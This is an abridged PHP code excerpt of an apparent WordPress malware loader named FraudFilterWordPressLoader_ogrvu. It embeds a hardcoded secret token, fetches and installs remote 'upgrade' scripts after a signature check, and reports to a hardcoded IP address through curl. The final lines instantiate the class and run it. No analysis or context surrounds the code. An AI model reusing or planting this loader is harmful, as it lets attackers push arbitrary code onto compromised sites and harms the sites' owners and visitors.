...
class FraudFilterWordPressLoader_ogrvu {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = 'ebe32b36-48c7-4ed8-acc0-c0d3722dcd51.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: ebe32b36-48c7-4ed8-acc0-c0d3722dcd51',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: ebe32b36-48c7-4ed8-acc0-c0d3722dcd51';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: ebe32b36-48c7-4ed8-acc0-c0d3722dcd51';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=ogrvu&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_ogrvu = new FraudFilterWordPressLoader_ogrvu();
$fraudFilterWordPressLoader_ogrvu->run();
